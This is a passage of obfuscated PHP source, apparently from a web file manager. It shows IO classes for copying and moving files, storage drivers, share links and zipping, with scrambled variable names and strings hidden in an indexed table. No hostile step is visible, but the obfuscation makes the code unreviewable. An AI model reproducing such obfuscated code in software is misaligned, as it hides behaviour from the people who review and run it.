$×Èê±«¥[1163]) { $„¨·ßê¹ = $×Èê±«¥[1187] . $§”ªôĞ . $×Èê±«¥[1188]; } else { $„¨·ßê¹ = (stripos($‡Àı§¸…, $×Èê±«¥[11]) ? $×Èê±«¥[1189] : $×Èê±«¥[12]) . ($×Èê±«¥[1190] . $‡Àı§¸… . $×Èê±«¥[1191] . $æ¤ëş¥á); } $æÕæœÄÜ[] = $„¨·ßê¹; } $€ÄÂ‚Ëİ = array($×Èê±«¥[1192] . $âŸï¥Ø¹ . $×Èê±«¥[1193], $×Èê±«¥[1194] . $âŸï¥Ø¹ . $×Èê±«¥[1195], implode($×Èê±«¥[50] . PHP_EOL, $æÕæœÄÜ), $×Èê±«¥[1196]); $Ëç–ãĞ‡ = implode(PHP_EOL, $€ÄÂ‚Ëİ); if ($î¬…·«ˆ && $î¬…·«ˆ == $×Èê±«¥[849]) { return $Ëç–ãĞ‡; } $ÈÙ¸©¤Æ = array($×Èê±«¥[849] => $Ëç–ãĞ‡, $×Èê±«¥[13] => $üáÍ°); return $î¬…·«ˆ ? $ÈÙ¸©¤Æ[$î¬…·«ˆ] : $ÈÙ¸©¤Æ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($È¶àÃé, $¸ëä¬å’) { $âÕãßõ¾ =& $_SERVER[•Ùç É]; $æƒÉÅ³º = $¸ëä¬å’; $GLOBALS[$âÕãßõ¾[1197]] = $âÕãßõ¾[1198] . $È¶àÃé; Hook::trigger($âÕãßõ¾[1198] . $È¶àÃé . $âÕãßõ¾[1199], $æƒÉÅ³º); $úÂ£Ê§£ = self::driverMake($¸ëä¬å’[0]); if (!$úÂ£Ê§£) { return !1; } if (method_exists($úÂ£Ê§£, $È¶àÃé)) { $ø½Òßà = @call_user_func_array(array($úÂ£Ê§£, $È¶àÃé), $¸ëä¬å’); } else { if (method_exists($úÂ£Ê§£, $âÕãßõ¾[1200])) { $ø½Òßà = @call_user_func_array(array($úÂ£Ê§£, $È¶àÃé), $¸ëä¬å’); } else { if (method_exists(self, $È¶àÃé)) { $ø½Òßà = @call_user_func_array(array(self, $È¶àÃé), $¸ëä¬å’); } else { $ø½Òßà = call_user_func_array(array(parent, $È¶àÃé), $¸ëä¬å’); } } } Hook::trigger($âÕãßõ¾[1198] . $È¶àÃé . $âÕãßõ¾[1201], $æƒÉÅ³º, $ø½Òßà); return $ø½Òßà; } public static function init($ÆÙŞ¯Î) { return self::driverMake($ÆÙŞ¯Î); } public static function copy($›ÄñÑÑŞ, $­ËºÕÛû, $ˆ¶”»ÏŠ = false, $İ¬Ë¢Şú = false) { return self::copyMoveStart($›ÄñÑÑŞ, $­ËºÕÛû, $ˆ¶”»ÏŠ, $_SERVER[•Ùç É][588], $İ¬Ë¢Şú); } public static function move($¹´ƒ­«·, $¥‰¼á, $îé¹·à¿ = false, $ü˜¯¢Ê = false) { return self::copyMoveStart($¹´ƒ­«·, $¥‰¼á, $îé¹·à¿, $_SERVER[•Ùç É][590], $ü˜¯¢Ê); } private static function copyMoveStart($à¿µÊÛ, $ÔúÆ‚Õ·, $×Ø€©´í, $øô…”æ³, $—ğ¶¨Ñµ) { $ŸÄÌ¤ˆÚ =& $_SERVER[•Ùç É]; $ÜÑ«ªÑ  = array($à¿µÊÛ, $ÔúÆ‚Õ·, $×Ø€©´í, $—ğ¶¨Ñµ); Hook::trigger($ŸÄÌ¤ˆÚ[1198] . $øô…”æ³ . $ŸÄÌ¤ˆÚ[1199], $ÜÑ«ªÑ ); $ìßõÎ = self::copyMove($à¿µÊÛ, $ÔúÆ‚Õ·, $×Ø€©´í, $øô…”æ³, $—ğ¶¨Ñµ); Hook::trigger($ŸÄÌ¤ˆÚ[1198] . $øô…”æ³ . $ŸÄÌ¤ˆÚ[1201], $ÜÑ«ªÑ , $ìßõÎ); return $ìßõÎ; } public static function saveFile($êæ×û—, $òè‡İ Ä, $ÚÊÎÉùµ = true) { $¿äÁÊÏ =& $_SERVER[•Ùç É]; $ù—ü–Ğ = self::info($òè‡İ Ä); $Ï¤Òï¢ö = self::driverMake($êæ×û—); $öÀ¬˜„ò = self::driverMake($òè‡İ Ä); $“Ùâ§î = !1; if ($öÀ¬˜„ò->pathParse[$¿äÁÊÏ[1202]]) { $“Ùâ§î = $öÀ¬˜„ò; $ˆÆ¬ı¢« = $öÀ¬˜„ò->pathParse[$¿äÁÊÏ[1202]]; $öÀ¬˜„ò = self::driverMake($ˆÆ¬ı¢«); } if ($Ï¤Òï¢ö->pathParse[$¿äÁÊÏ[1202]]) { $åûŸïúÊ = $Ï¤Òï¢ö->pathParse[$¿äÁÊÏ[1202]]; $Ï¤Òï¢ö = self::driverMake($åûŸïúÊ); } $ÕÓ¸ÉóÀ = $öÀ¬˜„ò->pathFather($òè‡İ Ä); $—Ú„™ù = !0; if (!$ÚÊÎÉùµ && self::driverIsSame($Ï¤Òï¢ö, $öÀ¬˜„ò)) { $—Ú„™ù = !1; } $ÔœıÛæƒ = self::copyFile($Ï¤Òï¢ö, $êæ×û—, $öÀ¬˜„ò, $ÕÓ¸ÉóÀ, $ù—ü–Ğ[$¿äÁÊÏ[32]], $—Ú„™ù); if ($“Ùâ§î) { $ÔœıÛæƒ = $“Ùâ§î->getPathOuter($ÔœıÛæƒ); } return $ÔœıÛæƒ; } private static function copyMove($çº€ÄÓ, $°³È¥‚á, $²ñ²²”Ñ, $Ï•½ÎŞ¤, $¨¬¦‡ùŞ = false) { $áŸöĞ³ =& $_SERVER[•Ùç É]; if (!$çº€ÄÓ || $çº€ÄÓ == $áŸöĞ³[8] || !$°³È¥‚á) { return !1; } ignore_timeout(); $§ÚÉ¿… = self::driverMake($çº€ÄÓ); $Ô‚ãÂ¡ = self::driverMake($°³È¥‚á); $Ä£Æ±œ© = $Ï•½ÎŞ¤ == $áŸöĞ³[590]; $·ÂÇË’Õ = !1; if ($Ô‚ãÂ¡->pathParse[$áŸöĞ³[1202]]) { $·ÂÇË’Õ = $Ô‚ãÂ¡; $°³È¥‚á = $Ô‚ãÂ¡->pathParse[$áŸöĞ³[1202]]; $Ô‚ãÂ¡ = self::driverMake($°³È¥‚á); } if ($§ÚÉ¿…->pathParse[$áŸöĞ³[1202]]) { $çº€ÄÓ = $§ÚÉ¿…->pathParse[$áŸöĞ³[1202]]; $§ÚÉ¿… = self::driverMake($çº€ÄÓ); } self::check($§ÚÉ¿…, $çº€ÄÓ, $Ô‚ãÂ¡, $°³È¥‚á); Hook::trigger($áŸöĞ³[1203], $§ÚÉ¿…, $çº€ÄÓ, $Ô‚ãÂ¡, $°³È¥‚á); $ç‘áîçÜ = self::driverIsSame($§ÚÉ¿…, $Ô‚ãÂ¡); if ($ç‘áîçÜ) { if ($Ï•½ÎŞ¤ == $áŸöĞ³[590] && !method_exists($Ô‚ãÂ¡, $áŸöĞ³[1204]) && trim($°³È¥‚á, $áŸöĞ³[8]) == trim($Ô‚ãÂ¡->pathFather($çº€ÄÓ), $áŸöĞ³[8])) { if ($§ÚÉ¿…->pathThis($çº€ÄÓ) != $¨¬¦‡ùŞ && !$§ÚÉ¿…->isTypeObject()) { return $§ÚÉ¿…->rename($çº€ÄÓ, $¨¬¦‡ùŞ); } return $Ô‚ãÂ¡->getPathOuter($çº€ÄÓ); } if (method_exists($Ô‚ãÂ¡, $Ï•½ÎŞ¤)) { return $Ô‚ãÂ¡->{$Ï•½ÎŞ¤}($çº€ÄÓ, $°³È¥‚á, $²ñ²²”Ñ, $¨¬¦‡ùŞ); } } if ($ç‘áîçÜ && $Ï•½ÎŞ¤ == $áŸöĞ³[590] && $Ô‚ãÂ¡->getType() == $áŸöĞ³[108]) { $È™°ºŞç = $Ô‚ãÂ¡->movePath($çº€ÄÓ, $°³È¥‚á, $¨¬¦‡ùŞ); if ($È™°ºŞç) { return $È™°ºŞç; } } $ÀÍäºğ€ = $§ÚÉ¿…->isFile($çº€ÄÓ); if (!$ÀÍäºğ€ && $Ô‚ãÂ¡->getType() == $áŸöĞ³[802] && $§ÚÉ¿…->getType() == $áŸöĞ³[108]) { $È™°ºŞç = $Ô‚ãÂ¡->copyFolderFromIO($§ÚÉ¿…, $çº€ÄÓ, $°³È¥‚á, $²ñ²²”Ñ, $Ä£Æ±œ©, $¨¬¦‡ùŞ); } else { $È™°ºŞç = self::copyPath($§ÚÉ¿…, $çº€ÄÓ, $Ô‚ãÂ¡, $°³È¥‚á, $²ñ²²”Ñ, $Ä£Æ±œ©, $ÀÍäºğ€, $¨¬¦‡ùŞ); } if ($È™°ºŞç && $Ä£Æ±œ©) { $§ÚÉ¿…->remove($çº€ÄÓ); } if ($·ÂÇË’Õ) { $È™°ºŞç = $·ÂÇË’Õ->getPathOuter($È™°ºŞç); } return $È™°ºŞç; } private static function check($ÑË×½œ, $”¢†şÖ², $ù–Ø÷úŞ, &$ÈéïÊ­ï) { $Ü‘Í˜Ù =& $_SERVER[•Ùç É]; if (self::driverIsSame($ÑË×½œ, $ù–Ø÷úŞ) && $ÑË×½œ->isFolder($”¢†şÖ²) && $ÑË×½œ->isParentOf($”¢†şÖ², $ÈéïÊ­ï)) { show_json(LNG($Ü‘Í˜Ù[1205]), !1); } if (!$ÑË×½œ->exist($”¢†şÖ²)) { show_json(LNG($Ü‘Í˜Ù[107]), !1); } } private static function copyPath($¥³îêµÌ, $ˆÂÚéâÌ, $áÑºÇº„, $ØûØÃ„€, $Ÿ£ÓÓ÷á, $Œ¾İæÚÆ, $¹ÅµÈë†, $÷’€ÁŸı = false, $ØŞÁğ¾ø = true) { $˜½Ç¿ =& $_SERVER[•Ùç É]; $ş¢óş‹À = empty($÷’€ÁŸı) && $÷’€ÁŸı !== $˜½Ç¿[214] ? $¥³îêµÌ->pathThis($ˆÂÚéâÌ) : $÷’€ÁŸı; if ($Ÿ£ÓÓ÷á) { $…ÉªùÂõ = $áÑºÇº„->fileNameExist($ØûØÃ„€, $ş¢óş‹À); $ÇÍŸ‹ = $ş¢óş‹À; $ş¢óş‹À = $áÑºÇº„->fileNameAuto($ØûØÃ„€, $ş¢óş‹À, $Ÿ£ÓÓ÷á, !$¹ÅµÈë†); if (!$…ÉªùÂõ || $ÇÍŸ‹ != $ş¢óş‹À) { $Ÿ£ÓÓ÷á = !1; } if ($ØŞÁğ¾ø && !$Ÿ£ÓÓ÷á) { $áÑºÇº„->_data[$˜½Ç¿[1206]] = !0; } } if ($¹ÅµÈë†) { return self::copyFile($¥³îêµÌ, $ˆÂÚéâÌ, $áÑºÇº„, $ØûØÃ„€, $ş¢óş‹À, $Œ¾İæÚÆ); } if ($Ÿ£ÓÓ÷á == REPEAT_RENAME_FOLDER) { $Ÿ£ÓÓ÷á = !1; } $ˆğËÁš” = rtrim($ØûØÃ„€, $˜½Ç¿[8]) . $˜½Ç¿[8] . $ş¢óş‹À; $¥‡áÑÄÌ = $áÑºÇº„->mkdir($áÑºÇº„->getPath($ˆğËÁš”), $Ÿ£ÓÓ÷á); $ØûØÃ„€ = $áÑºÇº„->getPathInner($¥‡áÑÄÌ); $œ”ˆ€ˆ€ = $¥³îêµÌ->listPath($ˆÂÚéâÌ, !0); $œ”ˆ€ˆ€ = is_array($œ”ˆ€ˆ€) ? $œ”ˆ€ˆ€ : array($˜½Ç¿[85] => array(), $˜½Ç¿[84] => array()); $¦šÓáùà = array_merge($œ”ˆ€ˆ€[$˜½Ç¿[85]], $œ”ˆ€ˆ€[$˜½Ç¿[84]]); foreach ($¦šÓáùà as $ÍâÄƒÚÁ) { $ÕØ­ÌÏİ = $ÍâÄƒÚÁ[$˜½Ç¿[33]] == $˜½Ç¿[216]; $ˆÂÚéâÌ = $¥³îêµÌ->getPathInner($ÍâÄƒÚÁ[$˜½Ç¿[86]]); $×ö–ØûŠ = self::copyPath($¥³îêµÌ, $ˆÂÚéâÌ, $áÑºÇº„, $ØûØÃ„€, $Ÿ£ÓÓ÷á, $Œ¾İæÚÆ, $ÕØ­ÌÏİ, !1, !1); if (!$×ö–ØûŠ) { IO::errorTips($˜½Ç¿[1207] . $ˆÂÚéâÌ . $˜½Ç¿[72] . $ØûØÃ„€); } } self::copyMoveKeepInfo($¥³îêµÌ, $ˆÂÚéâÌ, $¥‡áÑÄÌ); return $¥‡áÑÄÌ; } private static function copyFile($ÈÛïøí“, $¹ÉÓ‰œÄ, $ÓĞ¦ß¡…, $…ŞÅ¾ªø, $í”ª¸¨‰, $òˆÉƒ•µ) { $â¼ ğ—’ =& $_SERVER[•Ùç É]; $…ŞÅ¾ªø = $ÓĞ¦ß¡…->getPath(rtrim($…ŞÅ¾ªø, $â¼ ğ—’[8]) . $â¼ ğ—’[8] . $í”ª¸¨‰); $¢–øµé = $â¼ ğ—’[1208] . time() . rand_string(5); Hook::trigger($â¼ ğ—’[1209], $ÈÛïøí“, $¹ÉÓ‰œÄ, $ÓĞ¦ß¡…, $…ŞÅ¾ªø, $í”ª¸¨‰, $¢–øµé); if (self::driverIsSame($ÈÛïøí“, $ÓĞ¦ß¡…)) { if ($òˆÉƒ•µ) { $›®¶³ÇÄ = $ÓĞ¦ß¡…->moveFile($¹ÉÓ‰œÄ, $…ŞÅ¾ªø); } else { $›®¶³ÇÄ = $ÓĞ¦ß¡…->copyFile($¹ÉÓ‰œÄ, $…ŞÅ¾ªø); } Hook::trigger($â¼ ğ—’[1210], $ÈÛïøí“, $¹ÉÓ‰œÄ, $ÓĞ¦ß¡…, $…ŞÅ¾ªø, $í”ª¸¨‰, $›®¶³ÇÄ); self::copyMoveKeepInfo($ÈÛïøí“, $¹ÉÓ‰œÄ, $›®¶³ÇÄ); return $›®¶³ÇÄ; } $ÅßçÊŒ = TEMP_FILES; if ($GLOBALS[$â¼ ğ—’[6]][$â¼ ğ—’[91]][$â¼ ğ—’[841]]) { $ÅßçÊŒ = $GLOBALS[$â¼ ğ—’[6]][$â¼ ğ—’[91]][$â¼ ğ—’[841]]; } $¹á¶È× = $ÅßçÊŒ; mk_dir($¹á¶È×); $ÑãüÀãĞ = $¹á¶È× . $¢–øµé; $ñÄéíÎ¡ = $ÑãüÀãĞ; $ÑãüÀãĞ = $ÈÛïøí“->download($¹ÉÓ‰œÄ, $ÑãüÀãĞ); $ÑãüÀãĞ = $ÈÛïøí“->iconvApp($ÑãüÀãĞ); if (substr($ÑãüÀãĞ, strlen($ÅßçÊŒ)) == $ÅßçÊŒ) { $òˆÉƒ•µ = !0; } $›®¶³ÇÄ = $ÓĞ¦ß¡…->upload($…ŞÅ¾ªø, $ÑãüÀãĞ, $òˆÉƒ•µ); self::remove($ñÄéíÎ¡); Hook::trigger($â¼ ğ—’[1210], $ÈÛïøí“, $¹ÉÓ‰œÄ, $ÓĞ¦ß¡…, $…ŞÅ¾ªø, $í”ª¸¨‰, $›®¶³ÇÄ); self::copyMoveKeepInfo($ÈÛïøí“, $¹ÉÓ‰œÄ, $›®¶³ÇÄ); return $›®¶³ÇÄ; } private static function copyMoveKeepInfo($¢í›‹ü„, $øåˆïï·, $ şÆ” Ó) { if (!$ şÆ” Ó) { return; } $º½ÎÔÀİ = $¢í›‹ü„->info($øåˆïï·); if (!is_array($º½ÎÔÀİ)) { return; } IO::setModifyTime($ şÆ” Ó, $º½ÎÔÀİ[$_SERVER[•Ùç É][87]]); } public static function pathFather($¥ ¶¢÷ƒ) { $ÀŞ…¨Ë = IO::init($¥ ¶¢÷ƒ); $€œ¶î’” = $ÀŞ…¨Ë->pathFather($ÀŞ…¨Ë->path); return $ÀŞ…¨Ë->getPathOuter($€œ¶î’”); } public static function fileOut($ÅÅú–¯—, $¥Œì¢†İ = false, $¦ƒ·…û½ = false, $œæØşç˜ = '') { $Ó©ßÊ¹Ì = self::driverMake($ÅÅú–¯—); if ($Ó©ßÊ¹Ì->isFileOutServer()) { return $Ó©ßÊ¹Ì->fileOutServer($ÅÅú–¯—, $¥Œì¢†İ, $¦ƒ·…û½, $œæØşç˜); } return $Ó©ßÊ¹Ì->fileOut($ÅÅú–¯—, $¥Œì¢†İ, $¦ƒ·…û½, $œæØşç˜); } public static function fileOutImage($¡êªÀ™è, $è±¨©„ = 250) { $˜†ÌôÚ = array(250, 600, 1200, 2000, 3000, 5000); for ($¿ÏÌíè’ = 0; $¿ÏÌíè’ < count($˜†ÌôÚ); $¿ÏÌíè’++) { if ($¿ÏÌíè’ == 0 && $è±¨©„ <= $˜†ÌôÚ[$¿ÏÌíè’]) { $è±¨©„ = $˜†ÌôÚ[$¿ÏÌíè’]; break; } else { if ($è±¨©„ > $˜†ÌôÚ[$¿ÏÌíè’ - 1] && $è±¨©„ <= $˜†ÌôÚ[$¿ÏÌíè’]) { $è±¨©„ = $˜†ÌôÚ[$¿ÏÌíè’]; break; } else { if ($¿ÏÌíè’ == count($˜†ÌôÚ) - 1 && $è±¨©„ > $˜†ÌôÚ[$¿ÏÌíè’]) { $è±¨©„ = $˜†ÌôÚ[$¿ÏÌíè’]; break; } } } } $ğ­å×Šä = self::driverMake($¡êªÀ™è); if ($ğ­å×Šä->isFileOutServer()) { return $ğ­å×Šä->fileOutImageServer($¡êªÀ™è, $è±¨©„); } return $ğ­å×Šä->fileOutImage($¡êªÀ™è, $è±¨©„); } private static function driverIsSame($‹ÛøÍ¡, $°ˆ¼´ó) { $öÄÖ÷½Œ =& $_SERVER[•Ùç É]; $œ¤µå¥¡ = $‹ÛøÍ¡->getType(); $”êé˜  = $°ˆ¼´ó->getType(); if ($œ¤µå¥¡ != $”êé˜ ) { return !1; } if ($œ¤µå¥¡ == $öÄÖ÷½Œ[802]) { return !0; } if ($œ¤µå¥¡ == $öÄÖ÷½Œ[108]) { return !0; } if ($‹ÛøÍ¡->pathDriver == $°ˆ¼´ó->pathDriver) { return !0; } return !1; } public static function copyUpdate($û¬Í¢™, $ìÍÛŸú­) { $ÀÆç¡Ú =& $_SERVER[•Ùç É]; if (!IO::exist($û¬Í¢™)) { return !1; } if (!IO::exist($ìÍÛŸú­)) { IO::mkdir($ìÍÛŸú­); } $éÈÌç†Ö = array_to_keyvalue(self::listAllSimple($û¬Í¢™), $ÀÆç¡Ú[86]); $Ì®¯şğŞ = array_to_keyvalue(self::listAllSimple($ìÍÛŸú­), $ÀÆç¡Ú[86]); $ÙËÀÍÌ = array(); $‚ºıÕÊ‘ = array(); foreach ($éÈÌç†Ö as $å¼ÈÌ => $èÄ±¿À) { if (isset($Ì®¯şğŞ[$å¼ÈÌ])) { if ($èÄ±¿À[$ÀÆç¡Ú[77]] == 1) { continue; } if ($Ì®¯şğŞ[$å¼ÈÌ][$ÀÆç¡Ú[78]] == $èÄ±¿À[$ÀÆç¡Ú[78]]) { continue; } } if ($èÄ±¿À[$ÀÆç¡Ú[77]] == 1) { $‚ºıÕÊ‘[] = $ìÍÛŸú­ . $ÀÆç¡Ú[8] . trim($å¼ÈÌ, $ÀÆç¡Ú[8]); continue; } $óù–óß = strstr(trim($å¼ÈÌ, $ÀÆç¡Ú[8]), $ÀÆç¡Ú[8]) ? get_path_father($å¼ÈÌ) : $ÀÆç¡Ú[12]; $ÙËÀÍÌ[] = array($ÀÆç¡Ú[1211] => $èÄ±¿À[$ÀÆç¡Ú[88]], $ÀÆç¡Ú[1212] => rtrim($ìÍÛŸú­, $ÀÆç¡Ú[8]) . $ÀÆç¡Ú[8] . $óù–óß, $ÀÆç¡Ú[1213] => $èÄ±¿À); } $ÂÔ¯‘Ú = array($ÀÆç¡Ú[216] => $ÙËÀÍÌ, $ÀÆç¡Ú[77] => $‚ºıÕÊ‘); Hook::trigger($ÀÆç¡Ú[1214], $û¬Í¢™, $ìÍÛŸú­, $ÂÔ¯‘Ú); foreach ($‚ºıÕÊ‘ as $èÄ±¿À) { IO::mkdir($èÄ±¿À); } foreach ($ÙËÀÍÌ as $èÄ±¿À) { IO::copy($èÄ±¿À[$ÀÆç¡Ú[1211]], $èÄ±¿À[$ÀÆç¡Ú[1212]], REPEAT_REPLACE); } } public static function fileSubstr($»©£®¹÷, $«úµÀšç, $–ÚªÅÏš = false) { $µ¾ì÷Ôà =& $_SERVER[•Ùç É]; $‡Ş—ËÚó = self::driverMake($»©£®¹÷); $µ­“€±¯ = $‡Ş—ËÚó->size($»©£®¹÷); $±…İâüş = $«úµÀšç; $ò®Ó€“ = $–ÚªÅÏš; if ($«úµÀšç < 0) { $«úµÀšç = $µ­“€±¯ + $«úµÀšç; } if ($–ÚªÅÏš === !1) { $–ÚªÅÏš = $µ­“€±¯ - $«úµÀšç; } if ($«úµÀšç + $–ÚªÅÏš > $µ­“€±¯) { $–ÚªÅÏš = $µ­“€±¯ - $«úµÀšç; } if (!$µ­“€±¯ && $‡Ş—ËÚó->getType() == $µ¾ì÷Ôà[108] && !$‡Ş—ËÚó->exist($»©£®¹÷)) { $ñ‘Æó×‰ = get_path_this($»©£®¹÷); $òäˆğ…ë = parse_url_query($ñ‘Æó×‰); if (is_array($òäˆğ…ë) && isset($òäˆğ…ë[$µ¾ì÷Ôà[32]])) { $ñ‘Æó×‰ = urldecode($òäˆğ…ë[$µ¾ì÷Ôà[32]]); } throw new Exception($µ¾ì÷Ôà[1215] . LNG($µ¾ì÷Ôà[1216]) . $µ¾ì÷Ôà[1017] . clear_html($ñ‘Æó×‰) . $µ¾ì÷Ôà[12]); } if ($–ÚªÅÏš <= 0) { return $µ¾ì÷Ôà[12]; } if ($«úµÀšç < 0 || $«úµÀšç >= $µ­“€±¯ || $–ÚªÅÏš > 1024 * 1024 * 10) { throw new Exception("\146\151\154\145\x52\x65\x61\x64\x20\145\162\x72\x6f\162\41\40\163\x74\x61\x72\x74\75{$«úµÀšç}\x3b\154\x65\156\147\x74\x68\x3d{$–ÚªÅÏš}\73\40\163\x69\172\x65\x3d{$µ­“€±¯}\73"); } $¸œßöÒà = $‡Ş—ËÚó->fileSubstr($»©£®¹÷, $«úµÀšç, $–ÚªÅÏš); if (!$¸œßöÒà && $–ÚªÅÏš && isset($GLOBALS[$µ¾ì÷Ôà[1217]])) { throw new Exception($GLOBALS[$µ¾ì÷Ôà[1217]][$µ¾ì÷Ôà[1218]]); } return $¸œßöÒà; } private static function driverMake(&$êÊô¡š¹) { $úëÓ™´ =& $_SERVER[•Ùç É]; $Èûş€© = KodIO::parse($êÊô¡š¹); if (!self::$driverListSystem) { $®‰¯´¹‡ = Model($úëÓ™´[812])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($®‰¯´¹‡, $úëÓ™´[445]); } if ($Èûş€©[$úëÓ™´[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Èûş€©[$úëÓ™´[445]]]) { return !1; } $êÊô¡š¹ = $Èûş€©[$úëÓ™´[1219]]; $•öëö = self::driverGet($Èûş€©, $êÊô¡š¹); return $•öëö; } private static function driverGet($¾°ÜûúŸ, &$¸—ñê„ª) { $ã²ù¢£á =& $_SERVER[•Ùç É]; $†ªùÒÚ = $¾°ÜûúŸ[$ã²ù¢£á[1220]]; $¥¸«—îŠ = $¾°ÜûúŸ[$ã²ù¢£á[445]]; switch ($¾°ÜûúŸ[$ã²ù¢£á[33]]) { case KodIO::KOD_IO: $’¥³ÜÑ = self::$driverListSystem[$¥¸«—îŠ]; break; case KodIO::KOD_SOURCE: $¸—ñê„ª = $¥¸«—îŠ . $¸—ñê„ª; $’¥³ÜÑ = array($ã²ù¢£á[1221] => $ã²ù¢£á[1222], $ã²ù¢£á[6] => $¾°ÜûúŸ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $…ŒíÒÂ¶ = $GLOBALS[$ã²ù¢£á[1223]]; self::$driverListUser = array_to_keyvalue($…ŒíÒÂ¶, $ã²ù¢£á[445]); } $’¥³ÜÑ = self::$driverListUser[$¥¸«—îŠ]; break; case KodIO::KOD_SHARE_LINK: $’¥³ÜÑ = array($ã²ù¢£á[1221] => $ã²ù¢£á[1224], $ã²ù¢£á[6] => $¾°ÜûúŸ); $²‰ìš— = Action($ã²ù¢£á[1225])->sharePathInfo($¾°ÜûúŸ[$ã²ù¢£á[86]]); $¸—ñê„ª = $²‰ìš—[$ã²ù¢£á[183]]; if (!$²‰ìš—[$ã²ù¢£á[183]]) { $Ûğ‚²û = Model($ã²ù¢£á[634])->getInfo($²‰ìš—[$ã²ù¢£á[635]]); $¸—ñê„ª = KodIO::clear($Ûğ‚²û[$ã²ù¢£á[1226]] . $¾°ÜûúŸ[$ã²ù¢£á[1219]]); $¾°ÜûúŸ[$ã²ù¢£á[531]] = $Ûğ‚²û; $¾°ÜûúŸ[$ã²ù¢£á[1202]] = $¸—ñê„ª; $’¥³ÜÑ = array($ã²ù¢£á[1221] => $ã²ù¢£á[1227], $ã²ù¢£á[6] => $¾°ÜûúŸ); } break; case KodIO::KOD_SHARE_ITEM: $’¥³ÜÑ = array($ã²ù¢£á[1221] => $ã²ù¢£á[1228], $ã²ù¢£á[6] => $¾°ÜûúŸ); $Ûğ‚²û = Model($ã²ù¢£á[634])->getInfo($¾°ÜûúŸ[$ã²ù¢£á[445]]); if ($Ûğ‚²û[$ã²ù¢£á[183]] == $ã²ù¢£á[214]) { $¸—ñê„ª = KodIO::clear($Ûğ‚²û[$ã²ù¢£á[1226]] . $¾°ÜûúŸ[$ã²ù¢£á[1219]]); $¾°ÜûúŸ[$ã²ù¢£á[531]] = $Ûğ‚²û; $¾°ÜûúŸ[$ã²ù¢£á[1202]] = $¸—ñê„ª; $’¥³ÜÑ = array($ã²ù¢£á[1221] => $ã²ù¢£á[1229], $ã²ù¢£á[6] => $¾°ÜûúŸ); } else { if (!$¸—ñê„ª) { $¸—ñê„ª = $Ûğ‚²û[$ã²ù¢£á[183]]; } } break; default: $¸—ñê„ª = $¾°ÜûúŸ[$ã²ù¢£á[86]]; $’¥³ÜÑ = array($ã²ù¢£á[1221] => $ã²ù¢£á[1230]); break; } $Úëá¦¤à = $¾°ÜûúŸ[$ã²ù¢£á[86]]; if (!isset(self::$driverCache[$Úëá¦¤à])) { $µåçâ = strtolower($’¥³ÜÑ[$ã²ù¢£á[97]]); $éÉ‹Ô’€ = $GLOBALS[$ã²ù¢£á[6]][$ã²ù¢£á[91]][$ã²ù¢£á[871]]; $º‰Îúƒ = $ã²ù¢£á[76] . (isset($éÉ‹Ô’€[$µåçâ]) ? $éÉ‹Ô’€[$µåçâ] : ucfirst($µåçâ)); if (!class_exists($º‰Îúƒ)) { show_json("{$º‰Îúƒ}\40\156\x6f\164\x20\x65\x78\x69\x73\164\x73\41", !1); } $™öäÑßÏ = isset($’¥³ÜÑ[$ã²ù¢£á[6]]) ? $’¥³ÜÑ[$ã²ù¢£á[6]] : !1; self::$driverCache[$Úëá¦¤à] = new $º‰Îúƒ($™öäÑßÏ); } $£±¡™†Ç = self::$driverCache[$Úëá¦¤à]; $£±¡™†Ç->pathDriver = $†ªùÒÚ; $£±¡™†Ç->pathBase = $ã²ù¢£á[12]; if (isset($’¥³ÜÑ[$ã²ù¢£á[6]][$ã²ù¢£á[1231]])) { $£±¡™†Ç->pathBase = rtrim($’¥³ÜÑ[$ã²ù¢£á[6]][$ã²ù¢£á[1231]], $ã²ù¢£á[8]) . $ã²ù¢£á[8]; $¸—ñê„ª = $£±¡™†Ç->pathBase . ltrim($¸—ñê„ª, $ã²ù¢£á[8]); } $¸—ñê„ª = $£±¡™†Ç->getPath($¸—ñê„ª); if (isset($¾°ÜûúŸ[$ã²ù¢£á[1202]])) { $¸—ñê„ª = $¾°ÜûúŸ[$ã²ù¢£á[1202]]; } $£±¡™†Ç->path = $¸—ñê„ª; return $£±¡™†Ç; } public static function errorTips($¬²Âæî = false) { $ˆëÕ¤óÌ =& $_SERVER[•Ùç É]; static $¤ëªÉÏ = array(); $Ö¨çâ› = 1000; if ($¬²Âæî === -1) { return $¤ëªÉÏ ? $¤ëªÉÏ[count($¤ëªÉÏ) - 1] : $ˆëÕ¤óÌ[12]; } if ($¬²Âæî === !1) { return implode($ˆëÕ¤óÌ[248], $¤ëªÉÏ); } if (count($¤ëªÉÏ) >= $Ö¨çâ›) { $¤ëªÉÏ = array_slice($¤ëªÉÏ, $Ö¨çâ› * 0.5, $Ö¨çâ›); } $¤ëªÉÏ[] = $¬²Âæî; write_log($ˆëÕ¤óÌ[165] . ACTION . $ˆëÕ¤óÌ[1232] . $¬²Âæî, $ˆëÕ¤óÌ[1233]); } public static function getLastError($á´‚Ğœ‘ = '') { $ÎŞ—´•Ÿ = self::errorTips(-1); return $ÎŞ—´•Ÿ ? $ÎŞ—´•Ÿ : $á´‚Ğœ‘; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ĞÏãéÀ¿; if ($ĞÏãéÀ¿) { return $ĞÏãéÀ¿; } $Ä¬äôÅë = IO::init($_SERVER[•Ùç É][8]); return $Ä¬äôÅë; } private static function iconvSystem($…ûèˆï°) { return self::local()->iconvSystem($…ûèˆï°); } private static function iconvApp($ïï¿öŠ†) { return self::local()->iconvApp($ïï¿öŠ†); } public static function zipFolder($ªºÕ„¯˜, $ûÚ’²áê = "\172\151\x70", $‰È¤óµÇ = '', $Ë‡Ü…¼ğ = REPEAT_RENAME) { $îà×ö—ú =& $_SERVER[•Ùç É]; $İŒŒ’¬“ = IO::listPath($ªºÕ„¯˜); if (!$İŒŒ’¬“) { return !1; } $İŒŒ’¬“ = array_merge($İŒŒ’¬“[$îà×ö—ú[84]], $İŒŒ’¬“[$îà×ö—ú[85]]); return self::zip($İŒŒ’¬“, $ûÚ’²áê, $‰È¤óµÇ, $Ë‡Ü…¼ğ); } public static function zip($Ã‡Şê÷ğ, $ïĞñº¹§ = "\172\x69\x70", $ÁÁÃ‚Ñ’ = '', $°Ë½ÉŸå = REPEAT_RENAME) { $ÄÄ¸¯†á =& $_SERVER[•Ùç É]; if 